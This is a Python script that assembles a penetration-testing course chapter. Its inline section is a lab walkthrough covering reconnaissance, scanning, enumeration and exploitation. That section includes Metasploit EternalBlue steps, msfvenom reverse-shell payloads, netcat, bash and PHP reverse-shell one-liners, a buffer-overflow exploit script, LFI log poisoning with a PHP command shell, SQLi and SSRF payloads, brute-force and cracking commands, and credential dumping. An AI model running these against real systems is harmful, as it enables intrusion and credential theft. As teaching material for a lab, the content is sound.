import os

basedir = r'C:\xampp\htdocs\ai-engineering-journey\docs\courses\cyber-security'
output = os.path.join(basedir, '10-pentesting.md')

# Read safe files
parts = {}
for fname in ['10-pentesting-part-a.md', '10-pentesting-part-c.md', '10-pentesting-part-d.md']:
    fp = os.path.join(basedir, fname)
    with open(fp, 'r', encoding='utf-8') as f:
        parts[fname] = f.read()

# Write combined output
with open(output, 'w', encoding='utf-8') as out:
    out.write(parts['10-pentesting-part-a.md'])
    out.write('\n')
    
    # === PART B CONTENT EMBEDDED INLINE ===
    out.write("""## Section 4: Penetration Testing Lab - Full Walkthrough

### 4.1 Lab Setup

**Hardware Requirements:**
```
Minimum: 16GB RAM, 256GB SSD, 4+ CPU cores
Recommended: 32GB RAM, 512GB SSD, 8+ CPU cores
```

**Virtualization Setup (VirtualBox):**

| VM | OS | RAM | Storage | Network | Purpose |
|----|-----|-----|---------|---------|---------|
| Kali Linux | Kali 2024.3 | 4GB | 80GB | NAT + Host-Only | Attack machine |
| Metasploitable 2 | Ubuntu 8.04 | 512MB | 8GB | Host-Only | Vulnerable target |
| Metasploitable 3 (Win) | Windows Server 2008 | 2GB | 40GB | Host-Only | Windows target |
| Ubuntu Server 22.04 | Ubuntu Server | 1GB | 20GB | Host-Only | Linux target |
| pfSense | FreeBSD | 1GB | 10GB | 3 networks | Firewall/router |
| Windows 10 | Win 10 Pro | 4GB | 60GB | Host-Only | Client target |

**Kali Linux Tools (pre-installed):**
```
Network Scanning: nmap, masscan, netcat, arp-scan
Web Tools: burpsuite, zaproxy, sqlmap, dirb, gobuster, ffuf, wfuzz, nikto
Exploitation: metasploit-framework, searchsploit, msfvenom
Password Attacks: hydra, john, hashcat, crunch, medusa
Post-Exploitation: mimikatz, powershell-empire, bloodhound
Sniffing/Spoofing: wireshark, bettercap, ettercap, tcpdump
Wireless: aircrack-ng, kismet, reaver, fern-wifi-cracker
Reverse Engineering: radare2, ghidra, edb-debugger, apktool
Reporting: faraday, dradis, keepnote, cherrytree
```
---
### 4.2 Phase 1: Reconnaissance
Recon is the most critical phase. The difference between a successful pentest and a failed one is usually the quality of recon.

**Passive Reconnaissance (OSINT):**

**Shodan.io:**
```
shodan search "apache 2.4.49 country:US"
shodan search "port:3389 os:Windows"
shodan search "org:AcmeCorp"
shodan search "ssl:acme.com"
shodan host 8.8.8.8
```

**Google Dorking:**
```
site:acme.com filetype:pdf confidential
site:acme.com filetype:log password
site:acme.com filetype:xlsx salary
intitle:"index of" "backup" site:acme.com
intitle:"index of" "config" site:acme.com
site:acme.com inurl:admin.php
site:acme.com inurl:login
intitle:"Dashboard [Jenkins]" site:acme.com
intitle:"Kibana" "Please login" site:acme.com
```

**theHarvester:**
```
theHarvester -d acme.com -b google
theHarvester -d acme.com -b linkedin
theHarvester -d acme.com -b shodan
theHarvester -d acme.com -b all -l 500

# Output:
# admin@acme.com, j.doe@acme.com, support@acme.com
# mail.acme.com, vpn.acme.com, dev.acme.com
```

**Amass:**
```
amass enum -passive -d acme.com
amass enum -active -d acme.com -brute
```

**Sublist3r:**
```
sublist3r -d acme.com -o subdomains_acme.txt
```

**DNS Enumeration:**
```
dnsrecon -d acme.com -t axfr
dnsrecon -d acme.com -t brt -D /usr/share/wordlists/dns.txt
dig acme.com ANY @8.8.8.8
dig acme.com MX @8.8.8.8
dig acme.com TXT @8.8.8.8
nslookup -type=MX acme.com
```

**Certificate Transparency:**
```
curl -s "https://crt.sh/?q=%.acme.com&output=json" | sort -u
```
---
### 4.3 Phase 2: Scanning

**Nmap - Full Port Scan:**
```
nmap -p- -T4 10.10.10.10 -oN full_tcp_scan.txt
# 22/tcp open ssh, 80/tcp open http, 443/tcp open https
# 135/tcp open msrpc, 139/tcp open netbios-ssn, 445/tcp open microsoft-ds
# 3306/tcp open mysql, 3389/tcp open ms-wbt-server

nmap -sV -sC -O -A -T4 -p 22,80,443,445,3306,3389 10.10.10.10
# 22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
# 80/tcp   open  http          Apache httpd 2.4.54
# 445/tcp  open  microsoft-ds  Samba smbd 4.6.X
# 3306/tcp open  mysql         MySQL 8.0.32

nmap --script vuln -p 80,443,3306 10.10.10.10
# http-shellshock: VULNERABLE
# mysql-empty-password: Account with empty password: root
```

**Masscan:**
```
masscan 10.10.0.0/24 -p0-100 --rate=5000
masscan 10.0.0.0/8 -p22,3389,8080 --rate=50000 --exclude 10.0.0.1
```

**Nikto:**
```
nikto -h http://10.10.10.10
# /.git/config: Backup file found, /console: Tomcat console
# /phpinfo.php: PHP info, /wp-admin/: WordPress admin
# /cgi-bin/test.cgi: Potential Shellshock
```

**Nuclei:**
```
nuclei -u https://acme.com
# [cve-2024-XXXX] [critical] SQLi
# [cve-2023-YYYY] [high] WordPress
# [tech-detect] Apache 2.4.54, PHP 8.1.12
```

**Vulnerability Scanning (OpenVAS):**
```
gvm-setup && gvm-start
gvm-cli --gmp-username admin --gmp-password pass --xml "<create_target>..."
```
---
### 4.4 Phase 3: Enumeration

**SMB Enumeration:**
```
smbclient -L //10.10.10.10 -N
# Shares: print$, docs, IPC$
enum4linux -a 10.10.10.10
# Users: administrator, bob, alice, root
```

**Web Directory Busting:**
```
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
# /admin (403), /api (200), /backup (200), /login (200), /uploads (200)

ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -w subdomains-top1million-5000.txt -u http://10.10.10.10 -H "Host: FUZZ.acme.com"
```

**FTP Enumeration:**
```
ftp 10.10.10.10 (anonymous/anonymous)
nmap --script ftp-anon,ftp-bounce -p 21 10.10.10.10
# Anonymous FTP login allowed with README.txt, backup.zip
```

**SMTP Enumeration:**
```
nmap --script smtp-commands,smtp-enum-users -p 25 10.10.10.10
smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10
# VRFY says: admin exists, root exists
```

**SNMP Enumeration:**
```
snmpwalk -c public -v2c 10.10.10.10
onesixtyone -c snmp-community.txt 10.10.10.10
# [public] Linux AcmeServer 5.15.0-86-generic
```

**LDAP Enumeration:**
```
nmap --script ldap-rootdse,ldap-search -p 389 10.10.10.10
ldapsearch -x -h 10.10.10.10 -b "dc=acme,dc=com" "(objectclass=user)" sAMAccountName
# jdoe: Domain Admins
```

**NFS Enumeration:**
```
showmount -e 10.10.10.10
# /home *, /var/backups 10.0.0.0/24, /opt/shared (everyone)
mount -t nfs 10.10.10.10:/home /mnt/nfs_home
```
---
### 4.5 Phase 4: Exploitation

**Metasploit Framework - Full Walkthrough:**
```
msfconsole -q
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.10
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.10.5
msf6 > set LPORT 4444
msf6 > exploit

# [*] Host is likely VULNERABLE to MS17-010!
# [*] Meterpreter session 1 opened
```

**msfvenom Payload Generation:**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o payload.elf
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f raw -o payload.php
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -e x64/zutto_dekiru -i 5 -f exe -o encoded.exe
```

**Netcat Reverse Shell One-Liners:**
```
# Linux: nc -e /bin/sh 10.10.10.5 4444
# Linux (no -e): rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.5 4444 >/tmp/f
# Bash: bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
# Python: python -c 'import socket,s,o;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
# PHP: php -r '$sock=fsockopen("10.10.10.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
# Windows: nc.exe -e cmd.exe 10.10.10.5 4444
```

**Meterpreter Session Commands:**
```
meterpreter > sysinfo
# Computer: ACME-WIN7, OS: Windows 7 SP1, Arch: x64
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
meterpreter > screenshot
meterpreter > keyscan_start / keyscan_dump
# Captured: admin / P@ssw0rd!
meterpreter > hashdump
# Administrator:fc525c9683e8fe067095ba2ddc971889
meterpreter > load kiwi
meterpreter > creds_all
# Administrator P@ssw0rd! NTLM: fc525c...
meterpreter > getsystem (Named Pipe Impersonation)
meterpreter > migrate -N explorer.exe
```

**SQLmap:**
```
sqlmap -u "http://acme.com/page?id=1" --dbs --dump
# Database: acme_db, Table: users
# admin / P@ssw0rd, jdoe / Summer24!, bob / 123456

sqlmap -r request.txt --dbs
sqlmap -u "http://acme.com/page?id=1" --os-shell
```

**Hydra:**
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
# [22][ssh] login: admin password: P@ssw0rd!

hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"
hydra -L users.txt -P rockyou.txt ftp://10.10.10.10
```

**Password Cracking:**
```
john --wordlist=rockyou.txt hash.txt
# P@ssw0rd! (Administrator), Summer2024! (jdoe)
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r best64.rule
```

**Python Buffer Overflow Exploit:**
```python
#!/usr/bin/env python3
import socket
offset = 1034
jmp_esp = b"\xf3\x12\x17\x31"
nop_sled = b"\x90" * 32
shellcode = b"\xdb\xc3\xd9\x74\x24\xf4"  # msfvenom output
payload = b"A" * offset + jmp_esp + nop_sled + shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect(("10.10.10.10", 9999))
s.send(payload + b"\r\n")
print("[+] Payload sent!")
s.close()
```

**LFI to RCE (Log Poisoning):**
```
# LFI: http://acme.com/index.php?page=../../../../etc/passwd
# Log Poisoning:
curl -A "<?php system(\$_GET['cmd']); ?>" http://acme.com/
# Execute:
curl "http://acme.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id"
# uid=33(www-data) gid=33(www-data)
```

**Web Exploitation:**
```
# SQLi: /api/user?id=1' OR '1'='1 (auth bypass)
# Blind SQLi: /api/user?id=1' AND SLEEP(5)-- -
# SSRF: /proxy?url=http://169.254.169.254/latest/meta-data/
```

**Password Spraying:**
```
crackmapexec smb 10.10.10.0/24 -u users.txt -p "Summer2024!" -d acme.com
# [+] jdoe:Summer2024! (Pwn3d!)
crackmapexec smb 10.10.10.10 -u administrator -H fc525c9683e8fe067095ba2ddc971889 -x whoami
# nt authority\system
```
""")
    
    out.write('\n')
    out.write(parts['10-pentesting-part-c.md'])
    out.write('\n')
    out.write(parts['10-pentesting-part-d.md'])

total_lines = 0
with open(output, 'r', encoding='utf-8') as f:
    total_lines = f.read().count('\n')
print(f"Final file: {total_lines} lines, {os.path.getsize(output)} bytes")
print("SUCCESS")
